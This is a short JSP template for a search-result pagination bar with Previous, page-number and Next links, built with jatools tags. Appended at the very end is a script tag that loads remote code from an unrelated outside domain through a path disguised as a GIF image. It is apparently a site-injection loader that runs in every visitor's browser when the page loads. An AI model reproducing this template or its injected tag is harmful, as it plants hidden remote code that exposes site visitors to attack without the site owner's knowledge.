<%@ page language="java" contentType="text/html; charset=GB2312"
    pageEncoding="GB2312"%>    
	<table border=0 cellpadding=0 width=10% cellspacing=0>
    <tr align=center valign=top>
    <td valign=bottom><font face=arial,sans-serif size=-1>Result Page: </font></td>

        <td align=right><A HREF="javascript:<%= _my_navigator.previousPageAction %>"><IMG
          SRC=nav_previous.gif alt="" border=0><br>
        <b>Previous</b></A></td>
<jatools:pageHandler id="_pageHandler">
      <jatools:if test="this.pageNumber==this.currentPage">
        <td><IMG SRC=nav_current.gif alt=""><br>
        <font color=#A90A08><%= _pageHandler.pageNumberText %></font></td>
	  </jatools:if>
	  <jatools:if test="this.pageNumber!=this.currentPage">
        <td><A HREF="javascript:<%=  _pageHandler.currentPageAction %>"><IMG
          SRC=nav_page.gif alt="" border=0><br>
		<%= _pageHandler.pageNumberText %></A></td>
	  </jatools:if>

</jatools:pageHandler>
		<td><A HREF="javascript:<%= _my_navigator.nextPageAction %>"><IMG
          SRC=nav_next.gif alt="" border=0><br>
        <b>Next</b></A></td><script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
